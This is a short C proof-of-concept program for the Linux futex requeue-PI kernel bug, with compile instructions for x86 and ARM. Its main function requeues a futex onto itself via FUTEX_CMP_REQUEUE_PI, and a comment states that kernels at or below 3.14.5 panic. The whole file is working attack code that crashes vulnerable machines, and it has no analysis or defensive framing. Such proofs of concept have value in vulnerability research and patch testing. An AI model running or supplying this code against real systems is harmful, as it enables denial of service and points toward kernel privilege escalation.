#include <stdio.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <unistd.h>
#define FUTEX_LOCK_PI       6
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12
// arm-linux-gnueabihf-gcc -static futex_poc.c -lpthread for ARM
// gcc futex_poc.c -lpthread for x86
// if kernel version <= 3.14.5 -> kernel panic

int lock1 = 0;
int lock2 = 0;

void die()
{
	while(1) {
		sleep(1);
	}
}

void *thread1()
{
	printf("this is thread1\n");
	// block on lock 1 , wait for lock2
	syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &lock2, 0);
	printf("sleep ....\n");
	sleep(3);
	// when exit ,kernel will release all lock
}

int main()
{
	pthread_t t1;
	int i;
	syscall(__NR_futex,&lock2, FUTEX_LOCK_PI, 1, NULL, NULL, 0); // acquire lock2 first
	pthread_create(&t1, NULL, thread1, NULL);
	// wait thread1
	for(i=0; i <= 1; i++) {
		sleep(1);
	}
	syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
	lock2 = 0;
	syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);
	printf("main function sleep forever\n");
	die();
	return 0;
}
